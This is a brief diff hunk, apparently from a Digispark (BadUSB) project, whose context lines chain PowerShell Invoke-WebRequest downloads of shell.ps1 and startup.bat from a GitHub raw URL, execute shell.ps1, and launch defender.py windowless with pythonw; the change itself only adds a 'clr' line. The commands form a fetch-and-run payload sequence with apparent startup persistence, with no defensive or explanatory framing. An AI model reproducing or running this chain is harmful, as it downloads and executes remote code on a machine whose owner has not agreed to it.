@@ -3,6 +3,7 @@ powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcrea
 powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/shell.ps1 -OutFile shell.ps1
 powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/startup.bat -OutFile startup.bat
 powershell .\shell.ps1
+clr
 pythonw defender.py
 exit
 
